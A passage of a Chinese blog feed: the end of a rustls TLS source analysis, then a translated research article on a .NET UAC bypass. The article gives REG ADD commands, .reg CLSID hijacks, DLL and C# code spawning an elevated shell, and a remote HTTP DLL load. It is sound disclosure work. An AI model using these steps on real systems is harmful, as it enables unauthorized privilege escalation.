class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send_msg_encrypt-&gt;send_single_fragment-&gt;encrypt_outgoing(加密)</span><br></pre></td></tr></table></figure> <p>最后都是通过<code>queue_tls_message</code>将数据先缓存，然后在调用<code>write_tls</code>之后将数据发送。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pub fn write_tls(&amp;mut self, wr: &amp;mut Write) -&gt; io::Result&lt;usize&gt; &#123;</span><br><span class="line">    self.sendable_tls.write_to(wr)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p><strong>握手完成后</strong>，通过<code>ClientSession</code>实现的<code>io::write</code>（或者<code>write_all</code>）接口发送明文数据。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">impl io::Write for ClientSession &#123;</span><br><span class="line"> //先缓存数据</span><br><span class="line">    fn write(&amp;mut self, buf: &amp;[u8]) -&gt; io::Result&lt;usize&gt;&#123;</span><br><span class="line">            self.imp.common.send_some_plaintext(buf)</span><br><span class="line">    &#125;</span><br><span class="line"> //flush时才发送数据</span><br><span class="line">    fn flush(&amp;mut self) -&gt; io::Result&lt;()&gt; &#123;</span><br><span class="line">        self.imp.common.flush_plaintext();</span><br><span class="line">        Ok(())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p><code>send_some_plaintext</code>在根据是否握手完成有不同的操作，握手未完成时，先缓存明文到<code>sendable_plaintext</code>，握手完成后，直接调用<code>send_appdata_encrypt</code>缓存密文（进入<code>send_single_fragment</code>过程加密）。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pub fn send_some_plaintext(&amp;mut self, data: &amp;[u8]) -&gt; io::Result&lt;usize&gt; &#123;</span><br><span class="line">    self.send_plain(data, Limit::Yes)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn send_plain(&amp;mut self, data: &amp;[u8], limit: Limit) -&gt; io::Result&lt;usize&gt; &#123;</span><br><span class="line">    if !self.traffic &#123; //握手未完成</span><br><span class="line">        let len = match limit &#123; //缓存明文</span><br><span class="line">            Limit::Yes =&gt; self.sendable_plaintext.append_limited_copy(data),</span><br><span class="line">            Limit::No =&gt; self.sendable_plaintext.append(data.to_vec())</span><br><span class="line">        &#125;;</span><br><span class="line">        return Ok(len);</span><br><span class="line">    &#125;</span><br><span class="line">    //握手完成，直接缓存加密数据</span><br><span class="line">    Ok(self.send_appdata_encrypt(data, limit))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>握手完成时，之前缓存的明文数据通过<code>start_traffic</code>实际将数据加密缓存到sendable_tls，最后也是通过write_tls发送出去。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pub fn start_traffic(&amp;mut self) &#123;</span><br><span class="line">        self.traffic = true;</span><br><span class="line">        self.flush_plaintext();</span><br><span class="line">    &#125;</span><br><span class="line">-&gt;</span><br><span class="line">flush_plaintext-&gt;send_plain-&gt;send_appdata_encrypt-&gt;send_single_fragment-&gt; encrypt_outgoing(加密)</span><br></pre></td></tr></table></figure> <p>握手完成之后调用的<code>send_some_plaintext</code>是直接将数据加密缓存，在write_tls后发送出去。</p> <h3 id="server详解"><a href="#server详解" class="headerlink" title="server详解"></a>server详解</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">src/server/mod.rs 导出ServerSession接口，外部使用</span><br><span class="line">src/server/hs.rs tls协议中所有包处理，包括握手和传输</span><br><span class="line">src/client/</span><br></pre></td></tr></table></figure> <p>公开外部使用的借口ServerSession，内部由ServerSessionImpl实现。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pub struct ServerSessionImpl &#123;</span><br><span class="line">    pub config: Arc&lt;ServerConfig&gt;, //证书、密钥等配置</span><br><span class="line">    pub secrets: Option&lt;SessionSecrets&gt;, //会话密钥</span><br><span class="line">    pub common: SessionCommon, // 实际握手传输数据处理对象</span><br><span class="line">    sni: Option&lt;webpki::DNSName&gt;, //SNI(Server Name Indication) ，解决一个服务器使用多个域名和证书的SSL/TLS扩展</span><br><span class="line">    pub alpn_protocol: Option&lt;String&gt;,</span><br><span class="line">    pub error: Option&lt;TLSError&gt;,</span><br><span class="line">    pub state: Option&lt;Box&lt;hs::State + Send&gt;&gt;, //握手和传输中处理数据包的状态，每个状态的数据包处理对象</span><br><span class="line">    pub client_cert_chain: Option&lt;Vec&lt;key::Certificate&gt;&gt;, //client证书链</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p><strong>接口基本和ClientSession类似，不再详述</strong></p> <p><strong>握手流程</strong></p> <p>server和client处理握手的方式都一样，每个握手包处理对象都会实现State接口。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pub trait State &#123;</span><br><span class="line">    fn check_message(&amp;self, m: &amp;Message) -&gt; CheckResult;</span><br><span class="line">    fn handle(self: Box&lt;Self&gt;, sess: &amp;mut ServerSessionImpl, m: Message) -&gt; StateResult;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>然后在收到client消息之后，在<code>process_main_protocol</code>中调用对应握手包对象的handle函数，并且会返回握手期望处理的下次数据包对象给state，以便下次收到消息继续处理。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//process_main_protocol</span><br><span class="line">self.state = Some(st.handle(self, msg)?);</span><br></pre></td></tr></table></figure> <p>握手流程：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-----ExpectClientHello::handle</span><br><span class="line">-----ExpectTLS12Certificate::handle //如果需要验证client的证书，有这步</span><br><span class="line">-----ExpectTLS12ClientKX::handle //密钥交换</span><br><span class="line">-----ExpectTLS12CertificateVerify::handle //验证client证书</span><br><span class="line">-----ExpectTLS12CCS::handle //通知使用加密方式发送报文</span><br><span class="line">-----ExpectTLS12Finished::handle //握手完成</span><br><span class="line">-----ExpectTLS12Traffic:: handle //开发传输数据</span><br></pre></td></tr></table></figure> <p><strong>消息传输</strong></p> <p>同样，握手完成后，server在<code>ExpectTLS12Traffic::handle</code>中处理后续的传输协议中的消息。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">impl State for ExpectTLS12Traffic &#123;</span><br><span class="line">    fn handle(self: Box&lt;Self&gt;, sess: &amp;mut ServerSessionImpl, mut m: Message) -&gt; StateResult &#123;</span><br><span class="line">        println!(&quot;-----ExpectTLS12Traffic::handle&quot;);</span><br><span class="line">        sess.common.take_received_plaintext(m.take_opaque_payload().unwrap());</span><br><span class="line">        Ok(self)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>数据加密和解密流程基本和client类似，不再详述。</p> <p><strong>另外，client和server握手中需要发送的数据包构造都在hs.rs::emit_xxx函数中</strong></p> <h3 id="消息相关"><a href="#消息相关" class="headerlink" title="消息相关"></a>消息相关</h3><p>该部分存在单独的msgs目录下，包含了握手过程中各种消息类型的定义，消息传输具体设计的<code>fragment/deframe</code>等。</p> <p>所有消息统一的结构<code>Message</code>，<code>Message</code>也定义了一下方便获取字段和数据的借口，这里不再详述。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pub struct Message &#123;</span><br><span class="line">    pub typ: ContentType,</span><br><span class="line">    pub version: ProtocolVersion,</span><br><span class="line">    pub payload: MessagePayload,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//msgs/message.rs</span><br><span class="line">MessagePayload</span><br><span class="line">BorrowMessage</span><br><span class="line"></span><br><span class="line">//msgs/handshake.rs</span><br><span class="line">包含握手过程中，证书、密钥交换的一些数据结构</span><br><span class="line"></span><br><span class="line">//msgs/deframe.rs</span><br><span class="line">定义了MessageDeframer，管理Message数据，read/deframe_one</span><br><span class="line"></span><br><span class="line">//msgs/hsjoiner.rs</span><br><span class="line">HandshakeJoiner，重建握手数据，验证数据等定义</span><br><span class="line"></span><br><span class="line">//msgs/enums.rs</span><br><span class="line">各种版本号，算法类型号，握手包类型序号等等的enum定义</span><br><span class="line"></span><br><span class="line">//msgs/ccs.rs</span><br><span class="line">密钥交换相关定义</span><br></pre></td></tr></table></figure> <h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><table> <thead> <tr> <th>文件</th> <th>说明</th> </tr> </thead> <tbody> <tr> <td>key.rs</td> <td>密钥、证书结构定义</td> </tr> <tr> <td>pemfile.rs</td> <td>PEM文件解析生成密钥相关接口</td> </tr> <tr> <td>verify.rs</td> <td>证书验证相关</td> </tr> <tr> <td>suites.rs</td> <td>加密套件、密钥交换相关</td> </tr> <tr> <td>sign.rs</td> <td>签名相关</td> </tr> <tr> <td>vecbuf.rs</td> <td>所有消息数据最底层存储结构，vec构成</td> </tr> <tr> <td>webpki</td> <td>三方库，完成证书验证</td> </tr> <tr> <td>ring</td> <td>三方库，完成加密算法相关能力</td> </tr> </tbody> </table> <p><strong>下篇在根据示例代码分析一下rustls库具体的使用</strong></p> <p>转载请注明出处：<a href="https://anhkgg.github.io/rustls-source-code-analyze/">https://anhkgg.github.io/rustls-source-code-analyze/</a></p> ]]></content>          <summary type="html">            &lt;ul&gt; &lt;li&gt;作者：&lt;strong&gt;anhkgg&lt;/strong&gt; &lt;/li&gt; &lt;li&gt;日期：&lt;strong&gt;2017-11-16&lt;/strong&gt;&lt;/li&gt; &lt;/ul&gt; &lt;p&gt;rustls已经支持tls1.3，但是测试分析中使用的tls1.2，所以后面分析主要集中在tls1.2。&lt;/p&gt; &lt;p&gt;主要分析的源码内容：&lt;/p&gt; &lt;ol&gt; &lt;li&gt;client和server的握手协议流程&lt;/li&gt; &lt;li&gt;rustls是如何进行数据传输的&lt;/li&gt; &lt;li&gt;数据传输是如何加密解密的&lt;/li&gt; &lt;/ol&gt;          </summary>            <category term="rust" scheme="https://anhkgg.github.io/categories/rust/"/>                 <category term="rust" scheme="https://anhkgg.github.io/tags/rust/"/>            <category term="rustls" scheme="https://anhkgg.github.io/tags/rustls/"/>            <category term="源码分析" scheme="https://anhkgg.github.io/tags/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>            <category term="TLS/SSL" scheme="https://anhkgg.github.io/tags/TLS-SSL/"/>        </entry>      <entry>     <title>翻译：通过.NET程序提权绕过UAC</title>     <link href="https://anhkgg.github.io/tans-net-bypass-uac/"/>     <id>https://anhkgg.github.io/tans-net-bypass-uac/</id>     <published>2017-09-21T06:04:46.000Z</published>     <updated>2017-09-21T06:08:51.861Z</updated>          <content type="html"><![CDATA[<p>.NET框架可以通过用户自定义环境变量和CLSID注册表项来加载profiler DLL或者COM组件DLL，甚至当前进程是提权的。这种行为可以被利用来绕过Windows 7到10（包括最近的RS3）系统的默认UAC设置，如通过自动提权.NET进程（MMC管理单元）来加载任意的DLL。</p> <a id="more"></a> <h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>去年五月， Casey Smith在他的博客和Twitter上指出.NET分析器的DLL加载可能会被滥用，通过环境变量使合法的.NET程序加载一个恶意DLL</p> <p>当看到这一点，脑海中第一种想法就是，如果这个方法在高权限.NET进程也可以工作，那这将是一个绕过UAC的好办法。果然，确实如此。</p> <p>这个问题到写这篇博客时依然没有修复，而且可能一直如此——但是在7月，它被 Stefan Kanthak独立地发现并报告了，按完整披露流程公布了该问题。</p> <h1 id="绕过UAC"><a href="#绕过UAC" class="headerlink" title="绕过UAC"></a>绕过UAC</h1><p>要让一个.NET应用程序加载任意一个DLL，我们可以使用以下环境变量。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">COR_ENABLE_PROFILING=1</span><br><span class="line">COR_PROFILER=&#123;GUID&#125;</span><br><span class="line">COR_PROFILER_PATH=C:\path\to\some.dll</span><br></pre></td></tr></table></figure> <p>在.NET 4以下版本，CLSID必须在HKCR\CLSID{GUID}\InprocServer32定义包含profiling DLL的路径的注册表键。在最近版本中，CLR通过COR_PROFILER_PATH环境变量来找这个DLL，如果COR_PROFILER_PATH没有定义再使用CLSID查找。</p> <p>HKCR\CLSID是HKLM和HKCU下Software\Classes\CLSID组合起来显示的。在HKLM（或者系统环境变量）下创建CLSID键需要提权，而在HKCU下创建不需要。需要注意，在用户环境变量和HKCU注册表项下一切也都工作正常。</p> <p>可以简单使用一段批处理命令让它工作：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKCU\Software\Classes\CLSID\&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;\InprocServer32&quot; /ve /t REG_EXPAND_SZ /d &quot;C:\Temp\test.dll&quot; /f</span><br><span class="line">REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_PROFILER&quot; /t REG_SZ /d &quot;&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;&quot; /f</span><br><span class="line">REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_ENABLE_PROFILING&quot; /t REG_SZ /d &quot;1&quot; /f</span><br><span class="line">REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_PROFILER_PATH&quot; /t REG_SZ /d &quot;C:\Temp\test.dll&quot; /f</span><br><span class="line">mmc gpedit.msc</span><br></pre></td></tr></table></figure> <p>这些命令在低权限命令行下可以在高权限的mmc.exe进程中加载C:\temp\test.dll(如果存在)。可以绕过Windows 7到10（包括最新RS3）系统的默认UAC设置。</p> <p><img src="/img/net-bypass-uac-1.png" alt="net-bypass-uac-1.png"></p> <p><a href="https://gist.github.com/clavoillotte/f2fba9fa4ba8db14093a62164963d4a9" target="_blank" rel="noopener">内嵌DLL的powershell POC可以在这里找到（只支持X64）。</a></p> <p>这个DLL只在DLL_PROCESS_ATTACH下运行一个cmd.exe，会产生一个提权的命令行终端，然后马上退出当前进程，阻止MMC控制台弹出。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)</span><br><span class="line">&#123;</span><br><span class="line">    char cmd[] = &quot;cmd.exe&quot;;</span><br><span class="line"></span><br><span class="line">    switch (fdwReason)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        WinExec(cmd, SW_SHOWNORMAL);</span><br><span class="line">        ExitProcess(0);</span><br><span class="line">        break;</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">        break;</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>在Windows 7,8.1，10 1703和10 RS3 build 16275中测试通过。<br>当然，如果你有可访问的SMB共享，UNC路径也可以工作。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">COR_PROFILER_PATH=\\server\share\test.dll</span><br></pre></td></tr></table></figure> <h1 id="根本原因"><a href="#根本原因" class="headerlink" title="根本原因"></a>根本原因</h1><p>COM运行时在运行高权限进程时会阻止在HKCU查找CLSID，所以这种绕过方式无效，但是.NET运行时没有阻止，在这种情况下，.NET在shim组件查找时会查找这些键值。</p> <p><img src="/img/net-bypass-uac-2.png" alt="net-bypass-uac-2.png"></p> <p>如果要修复，需要CLR实现和COM一样的检查。</p> <h1 id="更多维度"><a href="#更多维度" class="headerlink" title="更多维度"></a>更多维度</h1><p>现在我们知道CLR是如何工作的了，我们可以在堆栈中找他CLR调用的其他在HKCU查找CLSID的实例。一个实例是GPEdit（Microsoft.GroupPolicy.AdmTmplEditor.GPMAdmTmplEditorManager）组件（在我测试虚拟机中CLSID是{B29D466A-857D-35BA-8712-A758861BFEA1}）。</p> <p><img src="/img/net-bypass-uac-3.png" alt="net-bypass-uac-3.png"></p> <p>查看HKCU已经存在的项中，好像是指向CLR程序及自己实现的组件。</p> <p><img src="/img/net-bypass-uac-4.png" alt="net-bypass-uac-4.png"></p> <p>我们可以在HKCU下像这样定义一个COM项（.reg格式）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;B29D466A-857D-35BA-8712-A758861BFEA1&#125;]</span><br><span class="line">@=&quot;Microsoft.GroupPolicy.AdmTmplEditor.GPMAdmTmplEditorManager&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;B29D466A-857D-35BA-8712-A758861BFEA1&#125;\Implemented Categories]</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;B29D466A-857D-35BA-8712-A758861BFEA1&#125;\Implemented Categories\&#123;62C8FE65-4EBB-45E7-B440-6E39B2CDBF29&#125;]</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;B29D466A-857D-35BA-8712-A758861BFEA1&#125;\InprocServer32]</span><br><span class="line">@=&quot;C:\\Windows\\System32\\mscoree.dll&quot;</span><br><span class="line">&quot;Assembly&quot;=&quot;TestDotNet, Version=0.0.0.0, Culture=neutral&quot;</span><br><span class="line">&quot;Class&quot;=&quot;TestDotNet.Class1&quot;</span><br><span class="line">&quot;RuntimeVersion&quot;=&quot;v4.0.30319&quot;</span><br><span class="line">&quot;ThreadingModel&quot;=&quot;Both&quot;</span><br><span class="line">&quot;CodeBase&quot;=&quot;file://C://Temp//test_managed.dll&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;B29D466A-857D-35BA-8712-A758861BFEA1&#125;\InprocServer32\10.0.0.0]</span><br><span class="line">&quot;Assembly&quot;=&quot;TestDotNet, Version=0.0.0.0, Culture=neutral&quot;</span><br><span class="line">&quot;Class&quot;=&quot;TestDotNet.Class1&quot;</span><br><span class="line">&quot;RuntimeVersion&quot;=&quot;v4.0.30319&quot;</span><br><span class="line">&quot;CodeBase&quot;=&quot;file://C://Temp//test_managed.dll&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;B29D466A-857D-35BA-8712-A758861BFEA1&#125;\ProgId]</span><br><span class="line">@=&quot;Microsoft.GroupPolicy.AdmTmplEditor.GPMAdmTmplEditorManager&quot;</span><br></pre></td></tr></table></figure></p> <p>MMC会加载我们的托管DLL，并且尝试访问TestDotNet.Class1类。C#没有一种简单的创建入口是DllMain的简单DLL（我们很懒所以不想写模块初始化），但是貌似注册表指向的类被加载了，所以我们只需要一个静态构造函数来执行我们的提权代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line"></span><br><span class="line">namespace TestDotNet</span><br><span class="line">&#123;</span><br><span class="line">   public class Class1</span><br><span class="line">   &#123;</span><br><span class="line">      static Class1()</span><br><span class="line">      &#123; </span><br><span class="line">         Process.Start(&quot;cmd.exe&quot;);</span><br><span class="line">         Environment.Exit(0);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p> <p>将DLL放在注册表项定义的位置，然后运行gpedit.msc，可以看到弹出了一个提权的终端（和.NET一样）。</p> <p><img src="/img/net-bypass-uac-5.png" alt="net-bypass-uac-5.png"></p> <p><img src="/img/net-bypass-uac-6.png" alt="net-bypass-uac-6.png"></p> <p>这种方式一个有趣的点是CodeBase不仅限于本地文件和SMB共享，这个DLL还可以从HTTP链接中加载。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;CodeBase&quot;=&quot;http://server:8080/test_managed.dll&quot;</span><br></pre></td></tr></table></figure></p> <p>需要注意的是下载的DLL会拷贝到硬盘上，所以这种方式比本地DLL更好检测（硬盘+网络组合）。</p> <p>另外一件好事（对攻击者）是这种方式下可以滥用多种CLSID。<br>下面是在compmgmt.msc，event、vwr.msc,secpol.msc和taskschd.msc可使用CLSID：</p> <ol> <li>托管DLL的Microsoft.ManagementConsole.Advanced.FrameworkSnapInFactor组件</li> </ol> <p><img src="/img/net-bypass-uac-7.png" alt="net-bypass-uac-7.png"><br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;D5AB5662-131D-453D-88C8-9BBA87502ADE&#125;]</span><br><span class="line">@=&quot;Microsoft.ManagementConsole.Advanced.FrameworkSnapInFactory&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;D5AB5662-131D-453D-88C8-9BBA87502ADE&#125;\Implemented Categories]</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;D5AB5662-131D-453D-88C8-9BBA87502ADE&#125;\Implemented Categories\&#123;62C8FE65-4EBB-45e7-B440-6E39B2CDBF29&#125;]</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;D5AB5662-131D-453D-88C8-9BBA87502ADE&#125;\InprocServer32]</span><br><span class="line">@=&quot;C:\\Windows\\System32\\mscoree.dll&quot;</span><br><span class="line">&quot;Assembly&quot;=&quot;TestDotNet, Version=0.0.0.0, Culture=neutral&quot;</span><br><span class="line">&quot;Class&quot;=&quot;TestDotNet.Class1&quot;</span><br><span class="line">&quot;RuntimeVersion&quot;=&quot;v2.0.50727&quot;</span><br><span class="line">&quot;ThreadingModel&quot;=&quot;Both&quot;</span><br><span class="line">&quot;CodeBase&quot;=&quot;file://C://Temp//test_managed.dll&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;D5AB5662-131D-453D-88C8-9BBA87502ADE&#125;\InprocServer32\3.0.0.0]</span><br><span class="line">&quot;Assembly&quot;=&quot;TestDotNet, Version=0.0.0.0, Culture=neutral&quot;</span><br><span class="line">&quot;Class&quot;=&quot;TestDotNet.Class1&quot;</span><br><span class="line">&quot;RuntimeVersion&quot;=&quot;v2.0.50727&quot;</span><br><span class="line">&quot;CodeBase&quot;=&quot;file://C://Temp//test_managed.dll&quot;</span><br></pre></td></tr></table></figure></p> <ol> <li>Native DLL的NDP SymBinder组件，劫持\Server项</li> </ol> <p><img src="/img/net-bypass-uac-8.png" alt="net-bypass-uac-8.png"></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;]</span><br><span class="line">@=&quot;NDP SymBinder&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\InprocServer32]</span><br><span class="line">@=&quot;C:\\Windows\\System32\\mscoree.dll&quot;</span><br><span class="line">&quot;ThreadingModel&quot;=&quot;Both&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\InprocServer32\4.0.30319]</span><br><span class="line">@=&quot;4.0.30319&quot;</span><br><span class="line">&quot;ImplementedInThisVersion&quot;=&quot;&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\ProgID]</span><br><span class="line">@=&quot;CorSymBinder_SxS&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\Server]</span><br><span class="line">@=&quot;C:\\Temp\\test_unmanaged.dll&quot;</span><br></pre></td></tr></table></figure> <ol> <li>Native DLL的Microsoft Common Language Runtime Meta Data组件，劫持\Server项（只有secpol.msc可用）</li> </ol> <p><img src="/img/net-bypass-uac-9.png" alt="net-bypass-uac-9.png"></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span 